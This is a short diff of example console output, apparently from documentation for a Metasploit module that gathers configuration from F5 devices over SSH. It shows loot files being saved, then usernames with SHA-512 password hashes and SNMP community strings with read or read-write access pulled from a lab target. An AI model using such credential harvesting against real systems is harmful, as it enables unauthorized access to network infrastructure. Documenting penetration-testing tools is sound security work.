@@ -65,7 +65,9 @@ resource (f5_ssh.rb)> run
 [+] Saving to /home/h00die/.msf4/loot/20200820143944_default_2.2.2.2_F5.show_net_045166.txt
 [*] Gathering info from show running-config
 [+] Saving to /home/h00die/.msf4/loot/20200820143949_default_2.2.2.2_F5.show_running__097351.txt
-[+] 2.2.2.2:22 Username 'admin' and hash $6$4FAWSZLi$VeSaxPM2/D1JOhMRN/GMkt5wHcbIVKaIC2g765ZD0VA9ZEEm8iyK40/ncGrZIGyJyJF4ivkScNZ59HWAIKMML/
+[+] 2.2.2.2:22 Username 'admin' with description 'Admin User' and shell tmsh with hash $6$PQvaMmyS$Bn5.2qIin7rC34tHUQ1Vu6fEeuDzQZqc25TSiDsmbB903RENBisWbTN9Mqh7g2x26VUbxdzwUzzmL7fB4T2iy1
+[+] 2.2.2.2:22 Username 'superlegit' with description 'a user account' and shell tmsh with hash $6$FTQz2reX$U0o37QjQYdg42dwCcLa.1H85hVTriQtxhlMoIM0cs4DFyW5s26kbrEgZG5Mfaxi9fgFfHrvDBGad7ikXnEZIP0
+[+] 2.2.2.2:22 Username 't' with description 't' and shell none with hash $6$iajXIq2B$ezy4hVW9A.5eN1xG4JZWFbY4bFaq7uUKwO9gDVLxvgzigsX4gquLW1NoSaZP9CtN0NnrbGV4QvtkA.esLJOg50
 [+] 2.2.2.2:22 SNMP Community 'public' with RO access
 [+] 2.2.2.2:22 SNMP Community 'rocommunity' with RO access
 [+] 2.2.2.2:22 SNMP Community 'rwcommunity' with RW access
